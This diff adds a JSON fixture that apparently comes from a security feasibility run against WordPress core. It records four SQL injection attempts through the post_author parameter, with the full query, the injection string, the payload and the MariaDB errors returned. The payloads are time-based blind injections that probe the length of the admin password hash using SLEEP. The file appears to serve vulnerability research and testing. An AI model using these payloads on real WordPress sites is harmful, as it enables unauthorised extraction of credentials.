@@ -1,0 +1,134 @@
+{
+  "provenance": {
+    "source_run": "tmp/wordpress-core-chain-feasibility/alias-native-6.9.4-20261117T011617",
+    "source_log": "logs.stdout",
+    "source_log_sha256": "a5fe3b6f1ed12cddc24bf1b9f7a9015fce948068f91ecacdd6498d1b2efd16c8",
+    "source_log_bytes": 39058,
+    "source_receipt_sha256": "94694ba019e832520e19963a58df3a617f6b1d59eff33902acbe96bec6e83dd5",
+    "selection": "Exact SQL error, query, decoded injection, inner expression and alias; zero-based exclusive-end byte spans. Prefixes/client addresses omitted; selected bytes unchanged.",
+    "scope": "Independent native REST controls, not Framework module output. Native scalar313 and DELETE/http://: primer differ from the module. Unit uses synthetic in-range scalar1009 and actual owner GET/ /// routing; aliases and inner expression are verbatim native inputs. No SQL execution claimed by unit doubles."
+  },
+  "queries": [
+    {
+      "alias": "join",
+      "native_scalar": 313,
+      "error": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'join)-- -)  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'pu...' at line 3",
+      "query": "SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID\\n\\t\\t\\t\\t\\t FROM wp_posts \\n\\t\\t\\t\\t\\t WHERE 1=1  AND wp_posts.post_author NOT IN (0) AND (SELECT 313 FROM (SELECT(IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)))join)-- -)  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))\\n\\t\\t\\t\\t\\t \\n\\t\\t\\t\\t\\t ORDER BY wp_posts.post_date DESC\\n\\t\\t\\t\\t\\t LIMIT 0, 10",
+      "injection": "0) AND (SELECT 313 FROM (SELECT(IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)))join)-- -",
+      "payload": "IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)",
+      "source_spans_bytes": {
+        "error": [
+          15056,
+          15284
+        ],
+        "query": [
+          15295,
+          15691
+        ],
+        "injection": [
+          15418,
+          15532
+        ],
+        "payload": [
+          15450,
+          15521
+        ],
+        "alias": [
+          15523,
+          15527
+        ]
+      }
+    },
+    {
+      "alias": "like",
+      "native_scalar": 313,
+      "error": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'like)-- -)  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'pu...' at line 3",
+      "query": "SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID\\n\\t\\t\\t\\t\\t FROM wp_posts \\n\\t\\t\\t\\t\\t WHERE 1=1  AND wp_posts.post_author NOT IN (0) AND (SELECT 313 FROM (SELECT(IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)))like)-- -)  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))\\n\\t\\t\\t\\t\\t \\n\\t\\t\\t\\t\\t ORDER BY wp_posts.post_date DESC\\n\\t\\t\\t\\t\\t LIMIT 0, 10",
+      "injection": "0) AND (SELECT 313 FROM (SELECT(IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)))like)-- -",
+      "payload": "IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)",
+      "source_spans_bytes": {
+        "error": [
+          20915,
+          21143
+        ],
+        "query": [
+          21154,
+          21550
+        ],
+        "injection": [
+          21277,
+          21391
+        ],
+        "payload": [
+          21309,
+          21380
+        ],
+        "alias": [
+          21382,
+          21386
+        ]
+      }
+    },
+    {
+      "alias": "desc",
+      "native_scalar": 313,
+      "error": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'desc)-- -)  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'pu...' at line 3",
+      "query": "SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID\\n\\t\\t\\t\\t\\t FROM wp_posts \\n\\t\\t\\t\\t\\t WHERE 1=1  AND wp_posts.post_author NOT IN (0) AND (SELECT 313 FROM (SELECT(IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)))desc)-- -)  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))\\n\\t\\t\\t\\t\\t \\n\\t\\t\\t\\t\\t ORDER BY wp_posts.post_date DESC\\n\\t\\t\\t\\t\\t LIMIT 0, 10",
+      "injection": "0) AND (SELECT 313 FROM (SELECT(IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)))desc)-- -",
+      "payload": "IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)",
+      "source_spans_bytes": {
+        "error": [
+          26561,
+          26789
+        ],
+        "query": [
+          26800,
+          27196
+        ],
+        "injection": [
+          26923,
+          27037
+        ],
+        "payload": [
+          26955,
+          27026
+        ],
+        "alias": [
+          27028,
+          27032
+        ]
+      }
+    },
+    {
+      "alias": "left",
+      "native_scalar": 313,
+      "error": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'left)-- -)  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'pu...' at line 3",
+      "query": "SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID\\n\\t\\t\\t\\t\\t FROM wp_posts \\n\\t\\t\\t\\t\\t WHERE 1=1  AND wp_posts.post_author NOT IN (0) AND (SELECT 313 FROM (SELECT(IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)))left)-- -)  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))\\n\\t\\t\\t\\t\\t \\n\\t\\t\\t\\t\\t ORDER BY wp_posts.post_date DESC\\n\\t\\t\\t\\t\\t LIMIT 0, 10",
+      "injection": "0) AND (SELECT 313 FROM (SELECT(IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)))left)-- -",
+      "payload": "IF((SELECT LENGTH(user_pass) FROM wp_users WHERE ID=1)=63,SLEEP(0.6),0)",
+      "source_spans_bytes": {
+        "error": [
+          32207,
+          32435
+        ],
+        "query": [
+          32446,
+          32842
+        ],
+        "injection": [
+          32569,
+          32683
+        ],
+        "payload": [
+          32601,
+          32672
+        ],
+        "alias": [
+          32674,
+          32678
+        ]
+      }
+    }
+  ],
+  "synthetic_unit_scalar": 1009
+}
